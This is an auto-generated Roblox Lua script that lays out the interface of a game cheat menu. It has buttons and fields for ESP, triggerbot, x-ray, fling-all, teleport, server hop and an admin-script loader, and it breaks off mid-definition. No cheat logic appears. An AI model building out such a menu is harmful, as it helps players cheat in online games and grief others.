-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local MAIN = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Frame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Container = Instance.new("Frame")
local NameLabel = Instance.new("TextLabel")
local Frame_3 = Instance.new("Frame")
local ProfilePicture = Instance.new("ImageLabel")
local UICorner_3 = Instance.new("UICorner")
local UICorner_4 = Instance.new("UICorner")
local InfoContainer = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local ServerPlayersLabel = Instance.new("TextLabel")
local ServerUptimeLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local Frame_4 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local Frame_5 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Frame_6 = Instance.new("Frame")
local UIListLayout_2 = Instance.new("UIListLayout")
local quickbuttons = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local Frame_7 = Instance.new("Frame")
local UICorner_8 = Instance.new("UICorner")
local Frame_8 = Instance.new("Frame")
local SPEED = Instance.new("TextBox")
local UICorner_9 = Instance.new("UICorner")
local xray = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local UIGradient_2 = Instance.new("UIGradient")
local triggerbot = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local UIGradient_3 = Instance.new("UIGradient")
local serverhop = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local UIGradient_4 = Instance.new("UIGradient")
local ESP = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local UIGradient_5 = Instance.new("UIGradient")
local invis = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local UIGradient_6 = Instance.new("UIGradient")
local lock = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local UIGradient_7 = Instance.new("UIGradient")
local infiniteyield = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local UIGradient_8 = Instance.new("UIGradient")
local flingall = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local UIGradient_9 = Instance.new("UIGradient")
local splitsectp = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local UIGradient_10 = Instance.new("UIGradient")
local UIListLayout_3 = Instance.new("UIListLayout")
local jumppower = Instance.new("TextBox")
local UICorner_19 = Instance.new("UICorner")
local UIGradient_11 = Instance.new("UIGradient")
local Teleport = Instance.new("TextBox")
local UICorner_20 = Instance.new("UICorner")
local UIGradient_12 = Instance.new("UIGradient")
local TextLabel_5 = Instance.new("TextLabel")
local TextLabel_6 = Instance.new("TextLabel")
local Frame_9 = Instance.new("Frame")
local UICorner_21 = Instance.new("UICorner")
local TextLabel_7 = Instance.new("TextLabel")
local Frame_10 = Instance.new("Frame")
local UICorner_22 = Instance.new("UICorner")
local TextLabel_8 = Instance.new("TextLabel")
local tpknocked = Instance.new("TextBox")
local UICorner_23 = Instance.new("UICorner")
local UIGradient_13 = Instance.new("UIGradient")
local Fling = Instance.new("TextBox")
local UICorner_24 = Instance.new("UICorner")
local UIGradient_14 = Instance.new("UIGradient")
local highlightplayer = Instance.new("TextBox")
local UICorner_25 = Instance.new("UICorner")
local UIGradient_15 = Instance.new("UIGradient")
local ImageButton = Instance.new("ImageButton")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local ImageButton_2 = Instance.new("ImageButton")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MAIN.Name = "MAIN"
MAIN.Parent = ScreenGui
MAIN.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MAIN.BorderColor3 = Color3.fromRGB(27, 42, 53)
MAIN.Position = UDim2.new(0, 269, 0, 259)
MAIN.Size = UDim2.new(0, 598, 0, 348)

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = MAIN

Frame.Parent = MAIN
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame.Position = UDim2.new(0, 2, 0, 2)
Frame.Size = UDim2.new(0, 596, 0, 346)

UICorner_2.CornerRadius = UDim.new(0, 4)
UICorner_2.Parent = Frame

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(-5.61156776e-06, 0, 0.0920204669, 0)
Frame_2.Size = UDim2.new(0, 596, 0, 1)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel.Position = UDim2.new(0.0130000003, 0, 0.00300000003, 1)
TextLabel.Size = UDim2.new(0, 97, 0, 28)
TextLabel.Font = Enum.Font.GothamMedium
TextLabel.Text = "/esp"
TextLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel.TextSize = 15.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

Container.Name = "Container"
Container.Parent = Frame
Container.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Container.BackgroundTransparency = 1.000
Container.BorderColor3 = Color3.fromRGB(27, 42, 53)
Container.Position = UDim2.new(0.0117449667, 0, 0.14161849, 0)
Container.Size = UDim2.new(0, 582, 0, 283)

NameLabel.Name = "NameLabel"
NameLabel.Parent = Container
NameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NameLabel.BackgroundTransparency = 1.000
NameLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
NameLabel.Position = UDim2.new(0.147020578, 0, -0.00442461763, 1)
NameLabel.Size = UDim2.new(0, 160, 0, 25)
NameLabel.Font = Enum.Font.GothamMedium
NameLabel.Text = "LOADIN"
NameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
NameLabel.TextSize = 15.000
NameLabel.TextXAlignment = Enum.TextXAlignment.Left

Frame_3.Parent = Container
Frame_3.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_3.Position = UDim2.new(0.0171821304, 0, 0, 0)
Frame_3.Size = UDim2.new(0, 69, 0, 67)

ProfilePicture.Name = "ProfilePicture"
ProfilePicture.Parent = Frame_3
ProfilePicture.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ProfilePicture.BorderColor3 = Color3.fromRGB(27, 42, 53)
ProfilePicture.Position = UDim2.new(0, 1, 0, 1)
ProfilePicture.Size = UDim2.new(0, 67, 0, 66)
ProfilePicture.Image = "rbxassetid://9581016780"

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = ProfilePicture

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = Frame_3

InfoContainer.Name = "InfoContainer"
InfoContainer.Parent = Frame_3
InfoContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfoContainer.BackgroundTransparency = 1.000
InfoContainer.BorderColor3 = Color3.fromRGB(27, 42, 53)
InfoContainer.Position = UDim2.new(0.0144927539, 0, 1.08955228, 0)
InfoContainer.Size = UDim2.new(0, 117, 0, 202)

UIListLayout.Parent = InfoContainer
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 8)

ServerPlayersLabel.Name = "ServerPlayersLabel"
ServerPlayersLabel.Parent = InfoContainer
ServerPlayersLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ServerPlayersLabel.BackgroundTransparency = 1.000
ServerPlayersLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
ServerPlayersLabel.Position = UDim2.new(0.0181546025, 0, 0.257059485, 1)
ServerPlayersLabel.Size = UDim2.new(0, 186, 0, 13)
ServerPlayersLabel.Font = Enum.Font.Gotham
ServerPlayersLabel.Text = "Player count: 100"
ServerPlayersLabel.TextColor3 = Color3.fromRGB(206, 206, 206)
ServerPlayersLabel.TextScaled = true
ServerPlayersLabel.TextSize = 15.000
ServerPlayersLabel.TextWrapped = true
ServerPlayersLabel.TextXAlignment = Enum.TextXAlignment.Left

ServerUptimeLabel.Name = "ServerUptimeLabel"
ServerUptimeLabel.Parent = InfoContainer
ServerUptimeLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ServerUptimeLabel.BackgroundTransparency = 1.000
ServerUptimeLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
ServerUptimeLabel.Position = UDim2.new(0.0181546025, 0, 0.257059485, 1)
ServerUptimeLabel.Size = UDim2.new(0, 186, 0, 13)
ServerUptimeLabel.Font = Enum.Font.Gotham
ServerUptimeLabel.Text = "Server uptime: 1h - 52m - 42s"
ServerUptimeLabel.TextColor3 = Color3.fromRGB(206, 206, 206)
ServerUptimeLabel.TextScaled = true
ServerUptimeLabel.TextSize = 15.000
ServerUptimeLabel.TextWrapped = true
ServerUptimeLabel.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_2.Name = ""
TextLabel_2.Parent = InfoContainer
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_2.Position = UDim2.new(0.0181546025, 0, 0.257059485, 1)
TextLabel_2.Size = UDim2.new(0, 186, 0, 13)
TextLabel_2.Font = Enum.Font.Gotham
TextLabel_2.Text = "VERSION 01."
TextLabel_2.TextColor3 = Color3.fromRGB(206, 206, 206)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 15.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_3.Parent = Frame_3
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_3.Position = UDim2.new(1.09515917, 0, 0.71974659, 1)
TextLabel_3.Size = UDim2.new(0, 47, 0, 9)
TextLabel_3.Font = Enum.Font.Gotham
TextLabel_3.Text = "ezrunsyou"
TextLabel_3.TextColor3 = Color3.fromRGB(206, 206, 206)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 15.000
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_4.Parent = Container
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_4.Position = UDim2.new(0.147020578, 0, 0.0697803274, 1)
TextLabel_4.Size = UDim2.new(0, 119, 0, 25)
TextLabel_4.Font = Enum.Font.Gotham
TextLabel_4.Text = "Welcome to the "
TextLabel_4.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 15.000
TextLabel_4.TextWrapped = true
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left

Frame_4.Parent = Container
Frame_4.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_4.Position = UDim2.new(0.914322972, -2, 0.00399995968, 0)
Frame_4.Size = UDim2.new(0, 50, 0, 289)

UICorner_5.CornerRadius = UDim.new(0, 4)
UICorner_5.Parent = Frame_4

Frame_5.Parent = Frame_4
Frame_5.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_5.Position = UDim2.new(0, 1, 0, 1)
Frame_5.Size = UDim2.new(0, 48, 0, 287)

UICorner_6.CornerRadius = UDim.new(0, 4)
UICorner_6.Parent = Frame_5

Frame_6.Parent = Frame_5
Frame_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_6.BackgroundTransparency = 1.000
Frame_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_6.Position = UDim2.new(0.229166672, 0, 0.0418118462, 0)
Frame_6.Size = UDim2.new(0, 25, 0, 267)

UIListLayout_2.Parent = Frame_6
UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_2.Padding = UDim.new(0, 25)

quickbuttons.Name = "quick buttons"
quickbuttons.Parent = Container
quickbuttons.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
quickbuttons.BorderColor3 = Color3.fromRGB(27, 42, 53)
quickbuttons.Position = UDim2.new(0.0201855432, -2, 0.576438129, 0)
quickbuttons.Size = UDim2.new(0, 512, 0, 126)

UICorner_7.CornerRadius = UDim.new(0, 4)
UICorner_7.Parent = quickbuttons

Frame_7.Parent = quickbuttons
Frame_7.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_7.Position = UDim2.new(0, 1, 0, 1)
Frame_7.Size = UDim2.new(0, 510, 0, 124)

UICorner_8.CornerRadius = UDim.new(0, 4)
UICorner_8.Parent = Frame_7

Frame_8.Parent = Frame_7
Frame_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_8.BackgroundTransparency = 1.000
Frame_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_8.Position = UDim2.new(0.0137254903, 0, 0.225806206, 0)
Frame_8.Size = UDim2.new(0, 497, 0, 87)

SPEED.Name = "SPEED"
SPEED.Parent = Frame_8
SPEED.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
SPEED.BorderColor3 = Color3.fromRGB(27, 42, 53)
SPEED.Position = UDim2.new(-0.0140845068, 0, 1.12643683, 0)
SPEED.Size = UDim2.new(0, 195, 0, 23)
SPEED.Font = Enum.Font.Gotham
SPEED.PlaceholderText = "SPEED"
SPEED.Text = ""
SPEED.TextColor3 = Color3.fromRGB(0, 0, 0)
SPEED.TextSize = 13.000

UICorner_9.CornerRadius = UDim.new(0, 3)
UICorner_9.Parent = SPEED

xray.Name = "xray"
xray.Parent = SPEED
xray.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
xray.BorderColor3 = Color3.fromRGB(27, 42, 53)
xray.Position = UDim2.new(1.05641055, 0, -0.304347813, 0)
xray.Size = UDim2.new(0, 91, 0, 23)
xray.AutoButtonColor = false
xray.Font = Enum.Font.Gotham
xray.Text = "XRAY"
xray.TextColor3 = Color3.fromRGB(209, 209, 209)
xray.TextSize = 14.000

UICorner_10.CornerRadius = UDim.new(0, 3)
UICorner_10.Parent = xray

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient.Rotation = 90
UIGradient.Parent = xray

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_2.Rotation = 90
UIGradient_2.Parent = SPEED

triggerbot.Name = "triggerbot"
triggerbot.Parent = SPEED
triggerbot.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
triggerbot.BorderColor3 = Color3.fromRGB(27, 42, 53)
triggerbot.Position = UDim2.new(1.55897462, 0, -0.304347813, 0)
triggerbot.Size = UDim2.new(0, 91, 0, 23)
triggerbot.AutoButtonColor = false
triggerbot.Font = Enum.Font.Gotham
triggerbot.Text = "TRIGGERBOT"
triggerbot.TextColor3 = Color3.fromRGB(209, 209, 209)
triggerbot.TextSize = 14.000

UICorner_11.CornerRadius = UDim.new(0, 3)
UICorner_11.Parent = triggerbot

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_3.Rotation = 90
UIGradient_3.Parent = triggerbot

serverhop.Name = "serverhop"
serverhop.Parent = SPEED
serverhop.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
serverhop.BorderColor3 = Color3.fromRGB(27, 42, 53)
serverhop.Position = UDim2.new(1.55900002, 0, 2.60899997, 0)
serverhop.Size = UDim2.new(0, 91, 0, 23)
serverhop.AutoButtonColor = false
serverhop.Font = Enum.Font.Gotham
serverhop.Text = "SERVERHOP"
serverhop.TextColor3 = Color3.fromRGB(209, 209, 209)
serverhop.TextSize = 14.000

UICorner_12.CornerRadius = UDim.new(0, 3)
UICorner_12.Parent = serverhop

UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_4.Rotation = 90
UIGradient_4.Parent = serverhop

ESP.Name = "ESP"
ESP.Parent = SPEED
ESP.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
ESP.BorderColor3 = Color3.fromRGB(27, 42, 53)
ESP.Position = UDim2.new(1.55897462, 0, 1.173913, 0)
ESP.Size = UDim2.new(0, 91, 0, 23)
ESP.AutoButtonColor = false
ESP.Font = Enum.Font.Gotham
ESP.Text = "ESP"
ESP.TextColor3 = Color3.fromRGB(209, 209, 209)
ESP.TextSize = 14.000

UICorner_13.CornerRadius = UDim.new(0, 3)
UICorner_13.Parent = ESP

UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_5.Rotation = 90
UIGradient_5.Parent = ESP

invis.Name = "invis"
invis.Parent = SPEED
invis.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
invis.BorderColor3 = Color3.fromRGB(27, 42, 53)
invis.Position = UDim2.new(1.05641055, 0, 1.173913, 0)
invis.Size = UDim2.new(0, 91, 0, 23)
invis.AutoButtonColor = false
invis.Font = Enum.Font.Gotham
invis.Text = "INVIS KINDA"
invis.TextColor3 = Color3.fromRGB(209, 209, 209)
invis.TextSize = 14.000

UICorner_14.CornerRadius = UDim.new(0, 3)
UICorner_14.Parent = invis

UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_6.Rotation = 90
UIGradient_6.Parent = invis

lock.Name = "lock"
lock.Parent = SPEED
lock.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
lock.BorderColor3 = Color3.fromRGB(27, 42, 53)
lock.Position = UDim2.new(1.05641055, 0, 2.60869575, 0)
lock.Size = UDim2.new(0, 91, 0, 23)
lock.AutoButtonColor = false
lock.Font = Enum.Font.Gotham
lock.Text = "LOCK"
lock.TextColor3 = Color3.fromRGB(209, 209, 209)
lock.TextSize = 14.000

UICorner_15.CornerRadius = UDim.new(0, 3)
UICorner_15.Parent = lock

UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_7.Rotation = 90
UIGradient_7.Parent = lock

infiniteyield.Name = "infinite yield"
infiniteyield.Parent = SPEED
infiniteyield.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
infiniteyield.BorderColor3 = Color3.fromRGB(27, 42, 53)
infiniteyield.Position = UDim2.new(2.07692337, 0, -0.304347813, 0)
infiniteyield.Size = UDim2.new(0, 91, 0, 23)
infiniteyield.AutoButtonColor = false
infiniteyield.Font = Enum.Font.Gotham
infiniteyield.Text = "INF YIELD"
infiniteyield.TextColor3 = Color3.fromRGB(209, 209, 209)
infiniteyield.TextSize = 14.000

UICorner_16.CornerRadius = UDim.new(0, 3)
UICorner_16.Parent = infiniteyield

UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_8.Rotation = 90
UIGradient_8.Parent = infiniteyield

flingall.Name = "fling all"
flingall.Parent = SPEED
flingall.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
flingall.BorderColor3 = Color3.fromRGB(27, 42, 53)
flingall.Position = UDim2.new(2.07692337, 0, 1.173913, 0)
flingall.Size = UDim2.new(0, 91, 0, 23)
flingall.AutoButtonColor = false
flingall.Font = Enum.Font.Gotham
flingall.Text = "FLING ALL"
flingall.TextColor3 = Color3.fromRGB(209, 209, 209)
flingall.TextSize = 14.000

UICorner_17.CornerRadius = UDim.new(0, 3)
UICorner_17.Parent = flingall

UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_9.Rotation = 90
UIGradient_9.Parent = flingall

splitsectp.Name = "split sec tp"
splitsectp.Parent = SPEED
splitsectp.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
splitsectp.BorderColor3 = Color3.fromRGB(27, 42, 53)
splitsectp.Position = UDim2.new(2.07692337, 0, 2.60869575, 0)
splitsectp.Size = UDim2.new(0, 91, 0, 23)
splitsectp.AutoButtonColor = false
splitsectp.Font = Enum.Font.Gotham
splitsectp.Text = "SPLITSECTP"
splitsectp.TextColor3 = Color3.fromRGB(209, 209, 209)
splitsectp.TextSize = 14.000

UICorner_18.CornerRadius = UDim.new(0, 3)
UICorner_18.Parent = splitsectp

UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_10.Rotation = 90
UIGradient_10.Parent = splitsectp

UIListLayout_3.Parent = Frame_8
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 10)

jumppower.Name = "jump power"
jumppower.Parent = Frame_8
jumppower.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
jumppower.BorderColor3 = Color3.fromRGB(27, 42, 53)
jumppower.Position = UDim2.new(-0.0140845068, 0, 1.12643683, 0)
jumppower.Size = UDim2.new(0, 195, 0, 23)
jumppower.Font = Enum.Font.Gotham
jumppower.PlaceholderText = "JUMP POWER"
jumppower.Text = ""
jumppower.TextColor3 = Color3.fromRGB(0, 0, 0)
jumppower.TextSize = 13.000

UICorner_19.CornerRadius = UDim.new(0, 3)
UICorner_19.Parent = jumppower

UIGradient_11.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_11.Rotation = 90
UIGradient_11.Parent = jumppower

Teleport.Name = "Teleport"
Teleport.Parent = Frame_8
Teleport.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Teleport.BorderColor3 = Color3.fromRGB(27, 42, 53)
Teleport.Position = UDim2.new(-0.0140845068, 0, 1.12643683, 0)
Teleport.Size = UDim2.new(0, 195, 0, 23)
Teleport.Font = Enum.Font.Gotham
Teleport.PlaceholderText = "TELEPORT USERNAME HERE"
Teleport.Text = ""
Teleport.TextColor3 = Color3.fromRGB(0, 0, 0)
Teleport.TextSize = 13.000

UICorner_20.CornerRadius = UDim.new(0, 3)
UICorner_20.Parent = Teleport

UIGradient_12.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_12.Rotation = 90
UIGradient_12.Parent = Teleport

TextLabel_5.Parent = Frame_7
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_5.Position = UDim2.new(0.0140000004, 3, 0.0439999998, 3)
TextLabel_5.Size = UDim2.new(0, 160, 0, 13)
TextLabel_5.Font = Enum.Font.GothamMedium
TextLabel_5.Text = "Quick Buttons"
TextLabel_5.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 15.000
TextLabel_5.TextWrapped = true
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

TextLabel_6.Parent = Container
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_6.Position = UDim2.new(0.351487935, 0, 0.0697803274, 1)
TextLabel_6.Size = UDim2.new(0, 67, 0, 25)
TextLabel_6.Font = Enum.Font.Gotham
TextLabel_6.Text = " invalidX."
TextLabel_6.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 15.000
TextLabel_6.TextWrapped = true
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left

Frame_9.Parent = Container
Frame_9.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame_9.BackgroundTransparency = 0.150
Frame_9.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_9.Position = UDim2.new(0.495079011, -2, -0.000891156436, 0)
Frame_9.Size = UDim2.new(0, 227, 0, 155)

UICorner_21.CornerRadius = UDim.new(0, 4)
UICorner_21.Parent = Frame_9

TextLabel_7.Parent = Frame_9
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_7.Position = UDim2.new(0.0140000004, 3, 0.0439999998, 3)
TextLabel_7.Size = UDim2.new(0, 160, 0, 13)
TextLabel_7.Font = Enum.Font.GothamMedium
TextLabel_7.Text = "Stuff"
TextLabel_7.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 15.000
TextLabel_7.TextWrapped = true
TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left

Frame_10.Parent = Container
Frame_10.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_10.Position = UDim2.new(0.496797234, -2, 0.00264241244, 0)
Frame_10.Size = UDim2.new(0, 225, 0, 153)

UICorner_22.CornerRadius = UDim.new(0, 4)
UICorner_22.Parent = Frame_10

TextLabel_8.Parent = Frame_10
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_8.Position = UDim2.new(0.00955566391, 3, 0.0505359136, 3)
TextLabel_8.Size = UDim2.new(0, 160, 0, 13)
TextLabel_8.Font = Enum.Font.GothamMedium
TextLabel_8.Text = "More Buttons"
TextLabel_8.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 15.000
TextLabel_8.TextWrapped = true
TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left

tpknocked.Name = "tpknocked"
tpknocked.Parent = Frame_10
tpknocked.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
tpknocked.BorderColor3 = Color3.fromRGB(27, 42, 53)
tpknocked.Position = UDim2.new(0.065915525, 0, 0.46630621, 0)
tpknocked.Size = UDim2.new(0, 195, 0, 23)
tpknocked.Font = Enum.Font.Gotham
tpknocked.PlaceholderText = "TP ON KNOCKED (DH GAMES)"
tpknocked.Text = ""
tpknocked.TextColor3 = Color3.fromRGB(0, 0, 0)
tpknocked.TextSize = 13.000

UICorner_23.CornerRadius = UDim.new(0, 3)
UICorner_23.Parent = tpknocked

UIGradient_13.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_13.Rotation = 90
UIGradient_13.Parent = tpknocked

Fling.Name = "Fling"
Fling.Parent = Frame_10
Fling.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Fling.BorderColor3 = Color3.fromRGB(27, 42, 53)
Fling.Position = UDim2.new(0.065915525, 0, 0.224476129, 0)
Fling.Size = UDim2.new(0, 195, 0, 23)
Fling.Font = Enum.Font.Gotham
Fling.PlaceholderText = "FLING USERNAME HERE"
Fling.Text = ""
Fling.TextColor3 = Color3.fromRGB(0, 0, 0)
Fling.TextSize = 13.000

UICorner_24.CornerRadius = UDim.new(0, 3)
UICorner_24.Parent = Fling

UIGradient_14.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_14.Rotation = 90
UIGradient_14.Parent = Fling

highlightplayer.Name = "highlightplayer"
highlightplayer.Parent = Frame_10
highlightplayer.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
highlightplayer.BorderColor3 = Color3.fromRGB(27, 42, 53)
highlightplayer.Position = UDim2.new(0.065915525, 0, 0.688528419, 0)
highlightplayer.Size = UDim2.new(0, 195, 0, 23)
highlightplayer.Font = Enum.Font.Gotham
